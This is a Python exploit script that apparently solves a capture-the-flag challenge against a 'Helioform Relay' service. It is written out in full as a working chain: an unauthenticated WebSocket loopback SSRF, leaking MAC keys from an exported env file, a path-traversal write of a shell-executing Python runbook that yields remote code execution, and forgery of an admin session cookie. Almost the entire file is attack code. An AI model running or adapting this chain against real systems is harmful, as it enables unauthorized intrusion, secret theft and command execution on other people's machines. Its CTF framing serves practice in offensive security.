#!/usr/bin/env python3
"""Helioform Relay 4.2 -- full chain to RCE as the relay user.

  hsp.raw.1 agent wire (no auth)
    -> DIAL loopback SSRF (127.0.0.1 only) -> catalogd/provd/recordd
    -> catalogd ticket + provd dotenv export -> CONSOLE_MAC_KEY, REPLICATION_MAC_KEY
    -> hsp-repl/1 to recordd 7713: signed hello + mode-1 commit with an ABSOLUTE
       stream_id -> drops a Python runbook into /var/lib/helioform/runbooks
    -> forge admin console cookie -> read the runbook's stdout from
       /console/automation -> flag.

stdlib only. Usage: python solve.py <host> <port>   e.g. w01.ctf.chronos-security.ro 37134
"""
import base64
import hashlib
import hmac
import json
import os
import re
import socket
import struct
import sys
import time
import urllib.error
import urllib.request

HOST = sys.argv[1] if len(sys.argv) > 1 else "w01.ctf.chronos-security.ro"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 37134
BASE = "http://%s:%d" % (HOST, PORT)


# ---- WebSocket (just enough to open the hsp.raw.1 subprotocol) ----
def ws_open(proto):
    s = socket.create_connection((HOST, PORT), timeout=8)
    key = base64.b64encode(os.urandom(16)).decode()
    s.sendall(("GET /mesh HTTP/1.1\r\nHost: %s:%d\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"
               "Sec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\n"
               "Sec-WebSocket-Protocol: %s\r\n\r\n" % (HOST, PORT, key, proto)).encode())
    buf = b""
    while b"\r\n\r\n" not in buf:
        buf += s.recv(4096)
    return s


# ---- HSP framing: "HSP1" | opcode u16 | flags u16 | len u32 | body ----
def frame(op, body=b"", flags=0):
    return b"HSP1" + struct.pack("<HHI", op, flags, len(body)) + body


def readframe(s, timeout=3.0):
    s.settimeout(timeout)
    hdr = b""
    try:
        while len(hdr) < 12:
            d = s.recv(12 - len(hdr))
            if not d:
                return None
            hdr += d
        op, flags, ln = struct.unpack("<HHI", hdr[4:12])
        body = b""
        while len(body) < ln:
            d = s.recv(ln - len(body))
            if not d:
                break
            body += d
        return (op, flags, body)
    except socket.timeout:
        return None


def splice(port):
    """Open the agent wire and DIAL 127.0.0.1:<port>, returning the spliced socket."""
    s = ws_open("hsp.raw.1")
    s.sendall(frame(0x01, b"solve")); readframe(s)            # HELLO
    s.sendall(frame(0x10, ("127.0.0.1:%d" % port).encode()))  # DIAL
    readframe(s)                                              # ok splice
    return s


# ---- catalogd ticket + provd export ----
def ticket():
    s = splice(7710)
    s.sendall(frame(0x01, b"")); hello = readframe(s)[2].decode()
    nonce = [l.split("=", 1)[1] for l in hello.splitlines() if l.startswith("nonce=")][0]
    s.sendall(frame(0x20, nonce.encode()))
    tk = readframe(s)[2].decode().splitlines()[0].split("=", 1)[1]
    s.close()
    return tk


def export_env(path):
    tk = ticket()
    s = splice(7711)
    s.sendall(frame(0x30, ("ticket=%s\npath=%s" % (tk, path)).encode()))
    r = readframe(s); s.close()
    return r[2].decode(errors="replace")


# ---- recordd (hsp-repl/1) ----
def rd_status():
    tk = ticket()
    s = splice(7712)
    s.sendall(frame(0x40, ("ticket=%s" % tk).encode()))
    d = dict(l.split("=", 1) for l in readframe(s)[2].decode().strip().splitlines())
    s.close()
    return d


def repl_hello_body(peer, epoch, tip, rkey):
    can = ("hsp-repl/1|hello|%d|%s|%s" % (epoch, tip.hex(), peer)).encode()
    mac = hmac.new(rkey, can, hashlib.sha256).digest()
    pe = peer.encode()
    return struct.pack("<H", len(pe)) + pe + struct.pack("<I", epoch) + tip + mac


def repl_blob_body(sid, epoch, tip, bind, body, rkey):
    bsha = hashlib.sha256(body).hexdigest()
    can = ("hsp-repl/1|blob|%d|%s|%s|%s|%s" % (epoch, tip.hex(), bind.hex(), sid, bsha)).encode()
    mac = hmac.new(rkey, can, hashlib.sha256).digest()
    b = sid.encode()
    return (struct.pack("<H", len(b)) + b + b"\x01" + struct.pack("<I", epoch)
            + tip + bind + struct.pack("<I", len(body)) + body + mac)


# ---- console cookie forge ----
def forge_cookie(mac_key, iss, aud):
    payload = {"iss": iss, "aud": aud, "role": "admin", "exp": int(time.time()) + 3600}
    pb = base64.urlsafe_b64encode(json.dumps(payload, separators=(",", ":")).encode()).rstrip(b"=").decode()
    mac = hmac.new(mac_key.encode(), pb.encode(), hashlib.sha256).hexdigest()
    return "hsp_session=%s.%s" % (pb, mac)


def console_get(path, cookie):
    req = urllib.request.Request(BASE + path, headers={"Cookie": cookie})
    try:
        return urllib.request.urlopen(req, timeout=15).read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.read().decode(errors="replace")


def main():
    env = {}
    for line in export_env("/etc/helioform/relay.env").splitlines():
        if "=" in line and not line.startswith("#"):
            k, v = line.split("=", 1); env[k] = v
    leaked = {k: env[k] for k in ("CONSOLE_MAC_KEY", "CONSOLE_ISS", "CONSOLE_AUD", "REPLICATION_MAC_KEY") if k in env}
    print("[*] leaked:", leaked)
    rkey = env["REPLICATION_MAC_KEY"].encode()   # cluster key is the raw dotenv string (ASCII), same as CONSOLE_MAC_KEY

    st = rd_status()
    epoch = int(st["epoch"]); tip = bytes.fromhex(st["tip"]); bind = bytes.fromhex(st["bind"])
    print("[*] recordd epoch=%d repl_port=%s" % (epoch, st.get("repl_port")))

    # Python runbook; header line then Python. Reads the flag and prints it.
    runbook = (b"HSP-RUNBOOK\n"
               b"import subprocess\n"
               b"print(subprocess.run(\"id; echo ===FLAG; cat /flag* /tmp/flag* 2>/dev/null\","
               b" shell=True, capture_output=True, text=True).stdout)\n")
    sid = "/var/lib/helioform/runbooks/pwn"   # absolute -> escapes os.path.join(root, sid)

    s = splice(7713)
    s.sendall(frame(0x11, repl_hello_body("relay-collector", epoch, tip, rkey)))
    print("[*] repl hello ->", readframe(s)[2])
    s.sendall(frame(0x17, repl_blob_body(sid, epoch, tip, bind, runbook, rkey)))
    r = readframe(s, 4.0)
    print("[*] commit ->", r[2] if r else None)
    s.close()

    cookie = forge_cookie(env["CONSOLE_MAC_KEY"], env["CONSOLE_ISS"], env["CONSOLE_AUD"])
    print("[*] waiting for scheduler to run the runbook...")
    for _ in range(8):
        time.sleep(5)
        page = console_get("/console/automation", cookie)
        m = re.search(r'<pre id="runbook-output">(.*?)</pre>', page, re.S)
        out = m.group(1) if m else page
        if "CSCTF{" in out:
            flag = re.search(r"CSCTF\{[^}]*\}", out).group()
            print("\n[+] FLAG:", flag)
            return
    print("[-] no flag yet (scheduler may need another cycle)")


if __name__ == "__main__":
    main()
